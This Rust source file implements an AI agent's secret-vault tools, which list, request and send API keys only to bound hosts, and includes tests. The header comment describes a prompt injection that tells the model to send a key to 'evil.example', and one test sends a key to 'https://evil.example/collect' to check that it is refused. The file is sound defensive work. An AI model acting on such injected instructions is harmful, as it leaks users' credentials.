//! The model's side of the vault: `secret_list`, `secret_request` and
//! `api_request`. None of them ever returns a value.
//!
//! USER, 2026-09-27: provider keys must stay usable "for usage or
//! complicated image/video gen … as long as it doesn't actually dump
//! them in the transcript". So the model keeps `$NAME` in commands for
//! what its policy allows, and gains a way to send a key that does not
//! go through a shell at all: `api_request` puts the value in a header
//! (or the query, or wherever `$NAME` appears) of a request to one of
//! the secret's OWN hosts, and nowhere else. A prompt injection that
//! says "send the key to evil.example" meets a refusal that names the
//! hosts the key may go to.
//!
//! `secret_request` is how the model asks for a key it does not have
//! without the operator pasting it into the chat: a [`AskKind::Secret`]
//! ask, shown only on a surface that can take input privately, whose
//! answer is "set" or "decline". The value arrives by its own route —
//! the desktop's masked field (a loopback-only POST), or `veles secret
//! set` in a terminal — and the tool only checks that the name now
//! resolves.

use crate::ask::{AskChoice, AskKind, AskRequest};
use crate::tools::Tool;
use async_trait::async_trait;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::Mutex;

/// A secret request the model made and a human has not answered yet.
/// The desktop's store route looks the ask up here, so the NAME and the
/// hosts it is stored with are the ones the model asked for, not
/// whatever a client sends.
#[derive(Debug, Clone)]
pub struct PendingSecret {
    pub name: String,
    pub purpose: String,
    pub hosts: Vec<String>,
    pub session_id: String,
}

static PENDING: Mutex<Option<HashMap<String, PendingSecret>>> = Mutex::new(None);

fn pending_put(ask_id: &str, p: PendingSecret) {
    if let Ok(mut m) = PENDING.lock() {
        m.get_or_insert_with(HashMap::new)
            .insert(ask_id.to_string(), p);
    }
}

fn pending_take(ask_id: &str) {
    if let Ok(mut m) = PENDING.lock() {
        if let Some(m) = m.as_mut() {
            m.remove(ask_id);
        }
    }
}

/// The request behind an open secret ask, for the store route.
pub fn pending(ask_id: &str) -> Option<PendingSecret> {
    PENDING
        .lock()
        .ok()
        .and_then(|m| m.as_ref().and_then(|m| m.get(ask_id).cloned()))
}

/// The policy a value stored for a request gets: the name's own (vault
/// or inferred), with the hosts the model named added — a user secret
/// asked for "to call api.example.com" may go to api.example.com.
pub fn policy_for_request(p: &PendingSecret) -> crate::vault::Policy {
    let cfg = crate::config::live();
    let mut policy = crate::secrets::policy_of(&p.name, &cfg);
    if !matches!(policy.kind, crate::vault::Kind::Platform) {
        for h in &p.hosts {
            if !policy.hosts.contains(h) {
                policy.hosts.push(h.clone());
            }
        }
    }
    if policy.note.is_empty() {
        policy.note = p.purpose.chars().take(120).collect();
    }
    policy
}

fn owner_only() -> String {
    "secrets are available only in the owner's own sessions".into()
}

/// A name the model may ask for: letters, digits, underscores, a letter
/// or `_` first — the same rule the vault enforces.
fn name_arg(args: &Value) -> Result<String, String> {
    let name = args["name"]
        .as_str()
        .or_else(|| args["secret"].as_str())
        .unwrap_or("")
        .trim()
        .trim_start_matches('$')
        .to_string();
    if !crate::secrets::valid_name(&name) {
        return Err(format!(
            "'{name}' is not a secret name: letters, digits and underscores, starting with a letter"
        ));
    }
    Ok(name)
}

// ─────────────────────────────────────────────────────────────────
// secret_list
// ─────────────────────────────────────────────────────────────────

pub struct SecretListTool {
    pub session_id: String,
}

#[async_trait]
impl Tool for SecretListTool {
    fn name(&self) -> &str {
        "secret_list"
    }
    fn description(&self) -> &str {
        "List the secrets this node has — names and what each may be used for, never \
values: `commands` means $NAME works in terminal and execute_code, `api_request` means \
api_request may send it to the hosts shown, `engine` means only veles itself uses it."
    }
    fn schema(&self) -> Value {
        json!({"type": "object", "properties": {}})
    }
    async fn call(&self, _args: Value) -> String {
        if !crate::secrets::session_may_use_secrets(&self.session_id) {
            return owner_only();
        }
        let all = crate::secrets::listing();
        if all.is_empty() {
            return "no secrets are stored — secret_request asks the operator for one".into();
        }
        all.iter().map(|l| l.line()).collect::<Vec<_>>().join("\n")
    }
}

// ─────────────────────────────────────────────────────────────────
// secret_request
// ─────────────────────────────────────────────────────────────────

pub struct SecretRequestTool {
    pub session_id: String,
    pub timeout_secs: u64,
}

#[async_trait]
impl Tool for SecretRequestTool {
    fn name(&self) -> &str {
        "secret_request"
    }
    fn description(&self) -> &str {
        "Ask the operator to store a secret (an API key, a token) that a task needs. They \
enter it privately — a masked field on the desktop, or `veles secret set` in a terminal — \
and it goes into the encrypted vault; you are told only whether it was set, never the \
value. Then use it as $NAME in commands, or through api_request. Never ask for a secret \
in chat, and never ask the operator to paste one into the conversation."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "Variable name, e.g. REPLICATE_API_TOKEN"},
                "purpose": {"type": "string", "description": "One line: what it is for, where to get it"},
                "hosts": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Hosts api_request may send it to (e.g. api.replicate.com)"
                }
            },
            "required": ["name", "purpose"]
        })
    }
    async fn call(&self, args: Value) -> String {
        if !crate::secrets::session_may_use_secrets(&self.session_id) {
            return owner_only();
        }
        let name = match name_arg(&args) {
            Ok(n) => n,
            Err(e) => return format!("secret_request error: {e}"),
        };
        if crate::secrets::resolve(&name).is_some() {
            return format!(
                "${name} is already set — use it as ${name} in a command, or with api_request"
            );
        }
        let purpose = args["purpose"].as_str().unwrap_or("").trim().to_string();
        let hosts: Vec<String> = args["hosts"]
            .as_array()
            .map(|a| {
                a.iter()
                    .filter_map(|h| h.as_str())
                    .map(|h| h.trim().to_ascii_lowercase())
                    .filter(|h| !h.is_empty())
                    .collect()
            })
            .unwrap_or_default();
        let req = AskRequest::new(
            &self.session_id,
            AskKind::Secret,
            &name,
            vec![
                AskChoice::new(crate::ask::CHOICE_SECRET_SET, "stored it"),
                AskChoice::new(crate::ask::CHOICE_SECRET_DECLINE, "decline"),
            ],
        )
        .with_detail(if hosts.is_empty() {
            purpose.clone()
        } else {
            format!("{purpose}\nfor: {}", hosts.join(", "))
        })
        .with_timeout(self.timeout_secs);
        let ask_id = req.id.clone();
        pending_put(
            &ask_id,
            PendingSecret {
                name: name.clone(),
                purpose,
                hosts,
                session_id: self.session_id.clone(),
            },
        );
        let answer = crate::ask::ask_session(&self.session_id, req).await;
        pending_take(&ask_id);
        let Some(answer) = answer else {
            return format!(
                "nobody at a desktop or terminal on this machine can take it privately \
                 right now. Ask the operator to run `veles secret set {name}` on this \
                 machine (it does not echo), and tell you when it is done — never to \
                 paste it into this chat."
            );
        };
        if answer.timed_out {
            return format!("no answer — ${name} is still not set");
        }
        match answer.first() {
            Some(crate::ask::CHOICE_SECRET_SET) => {
                if crate::secrets::resolve(&name).is_some() {
                    format!(
                        "${name} is set — use it as ${name} in a command, or with \
                         api_request; you will never see the value"
                    )
                } else {
                    format!(
                        "the operator answered \"stored it\", but ${name} does not \
                         resolve on this node — it may have gone into another machine's \
                         vault that has not synced here yet"
                    )
                }
            }
            _ => format!("the operator declined to store ${name}"),
        }
    }
}

// ─────────────────────────────────────────────────────────────────
// api_request
// ─────────────────────────────────────────────────────────────────

/// Response bodies up to this size come back as text; bigger ones, and
/// anything binary, are saved to the media directory.
const INLINE_MAX: usize = 64 * 1024;

pub struct ApiRequestTool {
    pub session_id: String,
}

#[async_trait]
impl Tool for ApiRequestTool {
    fn name(&self) -> &str {
        "api_request"
    }
    fn description(&self) -> &str {
        "Make an HTTP request that carries a secret, without the secret touching a \
command or this conversation. The secret goes only to its own hosts (secret_list shows \
them). auth: \"bearer\" (default) sends `Authorization: Bearer <value>`, \
\"header:NAME\" sends it in that header, \"query:NAME\" as that query parameter, \"none\" \
when you placed $NAME yourself in a header value or the body. The response is scrubbed; a \
large or binary body is saved to a file and its path returned. Use it for usage/quota \
checks and for multi-step generation APIs (submit, poll, fetch)."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "secret": {"type": "string", "description": "Secret name, e.g. DASHSCOPE_API_KEY"},
                "url": {"type": "string"},
                "method": {"type": "string", "description": "GET (default), POST, PUT, PATCH, DELETE"},
                "auth": {"type": "string", "description": "bearer | header:NAME | query:NAME | none"},
                "headers": {"type": "object", "additionalProperties": {"type": "string"}},
                "body": {"description": "A JSON value (sent as JSON) or a string"}
            },
            "required": ["secret", "url"]
        })
    }
    async fn call(&self, args: Value) -> String {
        match self.run(&args).await {
            Ok(s) => s,
            Err(e) => format!("api_request error: {e}"),
        }
    }
}

impl ApiRequestTool {
    async fn run(&self, args: &Value) -> Result<String, String> {
        if !crate::secrets::session_may_use_secrets(&self.session_id) {
            return Err(owner_only());
        }
        let name = name_arg(args)?;
        let url = args["url"].as_str().unwrap_or("").trim().to_string();
        let cfg = crate::config::live();
        let policy = crate::secrets::policy_of(&name, &cfg);
        if policy.hosts.is_empty() {
            return Err(format!(
                "${name} may not be sent anywhere by api_request (it has no hosts). The \
                 operator can allow one: `veles secret policy {name} --hosts <host>`"
            ));
        }
        let parsed = reqwest::Url::parse(&url).map_err(|e| format!("bad url: {e}"))?;
        if !matches!(parsed.scheme(), "https" | "http") {
            return Err("only http and https URLs".into());
        }
        if !crate::secrets::url_allowed(&url, &policy.hosts) {
            return Err(format!(
                "${name} may only be sent to {} — not to {}",
                policy.hosts.join(", "),
                parsed.host_str().unwrap_or("?")
            ));
        }
        let Some(value) = crate::secrets::resolve(&name) else {
            return Err(format!(
                "${name} is not set on this node — secret_request asks the operator for it"
            ));
        };
        let placeholder = format!("${name}");
        let fill = |s: &str| s.replace(&placeholder, &value);

        let method = args["method"]
            .as_str()
            .unwrap_or("GET")
            .to_ascii_uppercase();
        let method = reqwest::Method::from_bytes(method.as_bytes())
            .map_err(|_| format!("unknown method {method}"))?;
        let auth = args["auth"].as_str().unwrap_or("bearer").trim().to_string();

        let mut target = parsed.clone();
        if let Some(q) = auth.strip_prefix("query:") {
            target.query_pairs_mut().append_pair(q.trim(), &value);
        }
        // The value may appear where the model put `$NAME` in the URL's
        // own query — filled only now, after the host check.
        let target_str = fill(target.as_str());

        // Redirects are followed only to hosts the secret may go to;
        // anything else stops, and the Location is reported instead.
        let hosts = policy.hosts.clone();
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(120))
            .redirect(reqwest::redirect::Policy::custom(move |attempt| {
                if crate::secrets::url_allowed(attempt.url().as_str(), &hosts) {
                    attempt.follow()
                } else {
                    attempt.stop()
                }
            }))
            .build()
            .map_err(|e| e.to_string())?;
        let mut req = client.request(method.clone(), &target_str);
        match auth.as_str() {
            "bearer" | "" => req = req.bearer_auth(&value),
            "none" => {}
            a if a.starts_with("header:") => {
                req = req.header(a["header:".len()..].trim(), &value);
            }
            a if a.starts_with("query:") => {}
            other => return Err(format!("unknown auth '{other}'")),
        }
        if let Some(h) = args["headers"].as_object() {
            for (k, v) in h {
                if let Some(v) = v.as_str() {
                    req = req.header(k.as_str(), fill(v));
                }
            }
        }
        match &args["body"] {
            Value::Null => {}
            Value::String(s) => req = req.body(fill(s)),
            v => {
                let text = fill(&v.to_string());
                req = req.header("content-type", "application/json").body(text);
            }
        }
        let resp = req
            .send()
            .await
            .map_err(|e| crate::secrets::scrub(&e.to_string(), &one(&name, &value)))?;
        let status = resp.status();
        let location = resp
            .headers()
            .get("location")
            .and_then(|v| v.to_str().ok())
            .map(str::to_string);
        let ctype = resp
            .headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        let bytes = resp.bytes().await.map_err(|e| e.to_string())?;
        tracing::info!(
            "api_request: ${name} → {} {} {}",
            parsed.host_str().unwrap_or("?"),
            method,
            status.as_u16()
        );
        let mut scrub_set = crate::secrets::scrubbable();
        scrub_set.insert(name.clone(), value.clone());
        let mut out = format!("HTTP {}", status);
        if !ctype.is_empty() {
            out.push_str(&format!("  ({ctype})"));
        }
        if let Some(loc) = location.filter(|_| status.is_redirection()) {
            out.push_str(&format!(
                "\nredirect to {} — not followed (not one of this secret's hosts; fetch \
                 it without the key if it is a download link)",
                crate::secrets::scrub(&loc, &scrub_set)
            ));
        }
        let texty = ctype.is_empty()
            || ctype.contains("json")
            || ctype.starts_with("text/")
            || ctype.contains("xml")
            || ctype.contains("x-www-form-urlencoded");
        let as_text = std::str::from_utf8(&bytes).ok().filter(|_| texty);
        match as_text {
            Some(t) if t.len() <= INLINE_MAX => {
                out.push('\n');
                out.push_str(&crate::secrets::scrub(t, &scrub_set));
            }
            _ => {
                let path = save_body(&bytes, &ctype).map_err(|e| e.to_string())?;
                out.push_str(&format!(
                    "\n{} bytes saved to {}",
                    bytes.len(),
                    path.display()
                ));
            }
        }
        Ok(out)
    }
}

fn one(name: &str, value: &str) -> HashMap<String, String> {
    HashMap::from([(name.to_string(), value.to_string())])
}

/// Save a response body under `<media>/api/`, named by time and type.
fn save_body(bytes: &[u8], ctype: &str) -> std::io::Result<std::path::PathBuf> {
    let dir = crate::config::media_dir().join("api");
    std::fs::create_dir_all(&dir)?;
    let ext = match ctype.split(';').next().unwrap_or("").trim() {
        "image/png" => "png",
        "image/jpeg" => "jpg",
        "image/webp" => "webp",
        "image/gif" => "gif",
        "video/mp4" => "mp4",
        "audio/mpeg" => "mp3",
        "audio/wav" | "audio/x-wav" => "wav",
        "application/json" => "json",
        "application/pdf" => "pdf",
        t if t.starts_with("text/") => "txt",
        _ => "bin",
    };
    let stamp = chrono::Utc::now().format("%Y%m%dT%H%M%S%.3f");
    let path = dir.join(format!("{stamp}.{ext}"));
    std::fs::write(&path, bytes)?;
    Ok(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn vault_home() -> (tempfile::TempDir, crate::testenv::EnvGuard) {
        let (t, g) = crate::testenv::scratch_home();
        let mut v = crate::vault::Vault::open_or_create_local().unwrap();
        v.update(|v| v.init()).unwrap();
        (t, g)
    }

    fn store(name: &str, value: &str, kind: crate::vault::Kind, hosts: &[&str]) {
        crate::vault::set_local(
            name,
            value,
            crate::vault::Policy::default_for(kind, hosts.iter().map(|h| h.to_string()).collect()),
        )
        .unwrap();
    }

    /// One HTTP exchange on a real socket; returns the request head.
    async fn one_shot(body: &'static str) -> (u16, tokio::task::JoinHandle<String>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let h = crate::rt::spawn(async move {
            use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 16384];
            let n = sock.read(&mut buf).await.unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]).to_string();
            let head = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            );
            sock.write_all(head.as_bytes()).await.unwrap();
            sock.write_all(body.as_bytes()).await.unwrap();
            req
        });
        (port, h)
    }

    /// The key goes to its own host in the header asked for, and a
    /// response that echoes it comes back scrubbed.
    #[tokio::test]
    async fn api_request_sends_the_key_to_its_host_and_scrubs_the_echo() {
        let (_t, _g) = vault_home();
        let (port, srv) = one_shot("{\"echo\":\"sk-api-request-test-000111\"}").await;
        store(
            "VELES_T_API_KEY",
            "sk-api-request-test-000111",
            crate::vault::Kind::Provider,
            &[&format!("127.0.0.1:{port}")],
        );
        let tool = ApiRequestTool {
            session_id: "api-owner".into(),
        };
        let out = tool
            .call(json!({
                "secret": "VELES_T_API_KEY",
                "url": format!("http://127.0.0.1:{port}/v1/usage"),
            }))
            .await;
        let head = srv.await.unwrap();
        assert!(
            head.to_ascii_lowercase()
                .contains("authorization: bearer sk-api-request-test-000111"),
            "{head}"
        );
        assert!(out.starts_with("HTTP 200"), "{out}");
        assert!(!out.contains("sk-api-request-test-000111"), "{out}");
        assert!(out.contains("VELES_T_API_KEY=<REDACTED>"), "{out}");
    }

    /// A prompt injection that points the key at another host is
    /// refused before anything is sent.
    #[tokio::test]
    async fn api_request_refuses_a_host_the_secret_is_not_bound_to() {
        let (_t, _g) = vault_home();
        store(
            "VELES_T_BOUND_KEY",
            "sk-bound-to-one-host-0001",
            crate::vault::Kind::Provider,
            &["api.example.com"],
        );
        let tool = ApiRequestTool {
            session_id: "api-owner".into(),
        };
        let out = tool
            .call(json!({
                "secret": "VELES_T_BOUND_KEY",
                "url": "https://evil.example/collect",
            }))
            .await;
        assert!(out.contains("may only be sent to api.example.com"), "{out}");
        assert!(!out.contains("sk-bound"), "{out}");
        // A platform credential has no hosts at all.
        store(
            "VELES_T_BOT_TOKEN",
            "123456:bot-token-value-xyz",
            crate::vault::Kind::Platform,
            &["api.telegram.org"],
        );
        let out = tool
            .call(json!({
                "secret": "VELES_T_BOT_TOKEN",
                "url": "https://api.telegram.org/bot/getMe",
            }))
            .await;
        assert!(out.contains("may not be sent anywhere"), "{out}");
    }

    #[test]
    fn a_host_binding_matches_host_and_port_exactly() {
        let hosts = vec!["api.example.com".to_string(), "127.0.0.1:8080".to_string()];
        assert!(crate::secrets::url_allowed(
            "https://api.example.com/v1",
            &hosts
        ));
        assert!(crate::secrets::url_allowed(
            "https://API.example.com:8443/v1",
            &hosts
        ));
        assert!(crate::secrets::url_allowed(
            "http://127.0.0.1:8080/x",
            &hosts
        ));
        assert!(!crate::secrets::url_allowed(
            "http://127.0.0.1:9090/x",
            &hosts
        ));
        assert!(!crate::secrets::url_allowed(
            "https://api.example.com.evil.io/",
            &hosts
        ));
        assert!(!crate::secrets::url_allowed(
            "https://evil.io/?u=api.example.com",
            &hosts
        ));
        assert!(!crate::secrets::url_allowed("not a url", &hosts));
    }

    /// With nobody able to take input privately, the tool says what to
    /// do instead of waiting — and never suggests the chat.
    #[tokio::test]
    async fn secret_request_with_no_private_surface_points_at_the_cli() {
        let (_t, _g) = vault_home();
        let tool = SecretRequestTool {
            session_id: "secret-request-nobody".into(),
            timeout_secs: 5,
        };
        let out = tool
            .call(json!({"name": "VELES_T_WANTED", "purpose": "for a test"}))
            .await;
        assert!(out.contains("veles secret set VELES_T_WANTED"), "{out}");
        assert!(out.contains("never to"), "{out}");
    }

    /// The model is told "set" only once the name really resolves; the
    /// answer carries no value.
    #[tokio::test]
    async fn secret_request_reports_set_only_when_the_name_resolves() {
        let (_t, _g) = vault_home();
        struct StoresThenAnswers;
        #[async_trait]
        impl crate::ask::Asker for StoresThenAnswers {
            async fn ask(&self, req: AskRequest) -> crate::ask::AskAnswer {
                let p = pending(&req.id).expect("the request is pending while asked");
                crate::vault::set_local(
                    &p.name,
                    "sk-typed-in-a-masked-field",
                    policy_for_request(&p),
                )
                .unwrap();
                crate::ask::AskAnswer::choice(crate::ask::CHOICE_SECRET_SET)
            }
            fn private_input(&self) -> bool {
                true
            }
        }
        let sid = "secret-request-desk";
        crate::ask::set_session_asker(sid, std::sync::Arc::new(StoresThenAnswers));
        let tool = SecretRequestTool {
            session_id: sid.into(),
            timeout_secs: 5,
        };
        let out = tool
            .call(json!({"name": "VELES_T_ASKED", "purpose": "p", "hosts": ["api.example.com"]}))
            .await;
        crate::ask::clear_session_asker(sid);
        assert!(out.contains("$VELES_T_ASKED is set"), "{out}");
        assert!(!out.contains("sk-typed"), "{out}");
        let listed = crate::secrets::listing();
        let l = listed.iter().find(|l| l.name == "VELES_T_ASKED").unwrap();
        assert_eq!(l.policy.hosts, vec!["api.example.com".to_string()]);
    }

    /// An operator who typed the VALUE into a generic prompt (the TUI's
    /// free-text row) must not have it delivered or published as "the
    /// answer": a secret ask's answer is a choice and nothing else.
    #[tokio::test]
    async fn a_secret_asks_answer_never_carries_typed_text() {
        let mut bus = crate::session_tap::subscribe();
        let req = AskRequest::new("secret-free-text", AskKind::Secret, "K", vec![]);
        let leg = crate::ask::register(&req, None, None).expect("registered");
        let mut typed = crate::ask::AskAnswer::choice(crate::ask::CHOICE_SECRET_SET);
        typed.free_text = Some("sk-typed-where-it-should-not-be".into());
        assert!(crate::ask::resolve(&req.id, typed));
        let got = leg.wait().await;
        assert_eq!(got.first(), Some(crate::ask::CHOICE_SECRET_SET));
        assert!(got.free_text.is_none(), "{got:?}");
        // …and the bus event says "set", not the value.
        while let Ok(ev) = bus.try_recv() {
            assert!(!format!("{ev:?}").contains("sk-typed-where"), "{ev:?}");
        }
    }

    /// A chat surface never sees a secret ask, even when it is the only
    /// surface attached.
    #[tokio::test]
    async fn a_secret_ask_skips_surfaces_without_private_input() {
        struct Chat;
        #[async_trait]
        impl crate::ask::Asker for Chat {
            async fn ask(&self, _req: AskRequest) -> crate::ask::AskAnswer {
                panic!("a chat surface was shown a secret ask");
            }
        }
        let sid = "secret-request-chat-only";
        crate::ask::set_session_asker(sid, std::sync::Arc::new(Chat));
        let req = AskRequest::new(sid, AskKind::Secret, "X", vec![]);
        assert!(crate::ask::ask_session(sid, req).await.is_none());
        crate::ask::clear_session_asker(sid);
    }
}
